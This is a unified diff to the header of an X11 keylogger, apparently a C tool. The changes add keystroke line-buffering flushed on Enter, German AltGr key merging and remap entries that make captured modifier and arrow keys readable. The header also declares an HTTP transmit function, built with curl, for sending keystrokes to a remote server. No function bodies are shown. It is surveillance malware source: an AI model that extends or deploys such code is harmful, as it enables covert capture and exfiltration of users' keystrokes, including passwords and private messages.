@@ -15,7 +15,21 @@
 #define SHIFT_DOWN			1
 #define LOCK_DOWN			2
 #define CONTROL_DOWN		3
+#define ALT_DOWN			4
 #define DELAY				10000
+
+#define VIS_PREFIX_ALT		'+'
+#define VIS_PREFIX_CTRL		'^'
+#define VIS_PREFIX_ALTGR	'%'
+#define VIS_PREFIX_MENU		'$'
+#define VIS_PREFIX_SUPER    '%'
+
+
+/* The line_buf array holds all keystrokes until <ENTER> is pressed. It defaults
+ * to LINEBUF_INC_LEN characters at first; if the buffer isn't big enough,
+ * another LINEBUF_INC_LEN characters are appended to the array. */
+//#define LINEBUF_INC_LEN		256		/* If line-buffer  */
+#define LINEBUF_INC_LEN		10		/* If line-buffer  */
 
 #define XKBD_WIDTH			32
 #define BITS_PER_BYTE		8
@@ -67,16 +81,44 @@ struct config_struct {
 #endif //_HAVE_CURL
 };
 
+
+struct linebuf_struct {
+	char* buf;
+	int size;
+} linebuf;
+
+struct kdb_layout_ger_struct {
+	const char cur;
+	const char mod;
+	//const char replacement;
+	const wchar_t replacement;
+};
+
+const struct kdb_layout_ger_struct kbd_layout_ger[] = {
+	{'q', VIS_PREFIX_ALTGR, '@'},
+	{'1', VIS_PREFIX_ALTGR, '¹'},
+	{'2', VIS_PREFIX_ALTGR, '²'},
+	{'3', VIS_PREFIX_ALTGR, '³'},
+	{'4', VIS_PREFIX_ALTGR, '¼'},
+	{'5', VIS_PREFIX_ALTGR, '½'},
+	{'6', VIS_PREFIX_ALTGR, '¬'},
+	{'7', VIS_PREFIX_ALTGR, '{'},
+	{'8', VIS_PREFIX_ALTGR, '['},
+	{'9', VIS_PREFIX_ALTGR, ']'},
+	{'0', VIS_PREFIX_ALTGR, '}'},
+//	{'ß', VIS_PREFIX_ALTGR, '\\'},
+	{ 0, 0, 0 }
+};
+
 /* globals */
 const struct remap_struct {
 	char src[20], dst[8];
 } remap[] = {
 	{"Return","\n"},
-	{"escape","^["},
-	{"delete", ">D"},
-	{"shift",""},
-	{"control",""},
-	{"tab","\t"},
+	{"Escape","[ESC]"},
+	{"Delete", ">D"},
+	// {"Shift",""},
+	// {"Control",""},
 	{"space", " "},
 	{"exclam", "!"},
 	{"quotedbl", "\""},
@@ -99,7 +141,7 @@ const struct remap_struct {
 	{"equal", "="},
 	{"greater", ">"},
 	{"question", "?"},
-	{"at", "@"},
+	{"At", "@"},
 	{"bracketleft", "["},
 	{"backslash", "\\"},
 	{"bracketright", "]"},
@@ -117,6 +159,44 @@ const struct remap_struct {
 	{"Adiaeresis","Ä"},
 	{"Udiaeresis","Ü"},
 	{"ssharp","ß"},
+	{"section","$"},
+	{"acute","´"},
+	{"degree","°"},
+
+/* If _UNICODE is defined, let's replace some special characters with
+ * more representive single-characters unicode equivalents for better
+ * readability (this should be the default). */
+#ifdef _UNICODE
+	{"BackSpace","←"},
+
+	{"Up","↑"},
+	{"Down","↓"},
+	{"Left","←"},
+	{"Right","→"},
+
+	{"Tab","↓"},
+#else 
+	//{"BackSpace","←"},
+
+	//{"Up","↑"},
+	//{"Down","↓"},
+	//{"Left","←"},
+	//{"Right","→"},
+
+	{"Tab","\t"},
+#endif
+
+	{"Control_L",        VIS_PREFIX_CTRL},        /* Left CTRL key */
+	{"Control_R",        VIS_PREFIX_CTRL},        /* Right CTRL key */
+	{"Alt_L",            VIS_PREFIX_ALT},         /* Left Alt key */
+	{"Alt_R",            VIS_PREFIX_ALT},         /* Right Alt key */
+	{"Menu",             VIS_PREFIX_MENU},        /* Right Windows-Menu key */
+	{"ISO_Level3_Shift", VIS_PREFIX_ALTGR},       /* Alt-Gr */
+	{"Super_L",          VIS_PREFIX_SUPER},       /* Left Windows key*/
+
+	{"Shift_L",""},
+	{"Shift_R",""},
+
 	{"",""}
 };
 
@@ -219,6 +299,16 @@ int			transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow)
  * */
 size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none);
 #endif
+
+/* If -l is specified, update the line-buffer (which is flushed only after
+ * ENTER is pressed. */
+int			linebuf_update	(const char* s, struct config_struct* config);
+
+/* Replace a sequence of 2 keystrokes into a single new one. This can be
+ * particularly interesting with certain modifier keys (e.g., on German
+ * keyboard layouts, '@' is typed AltGr+q. Instead of showing VIS_MOD_XXX + q,
+ * we can replace it with the correct character. */
+void		merge_split_keys(char key, const char mod, const char replacement);
 
 #endif // _X11LOG_H
 
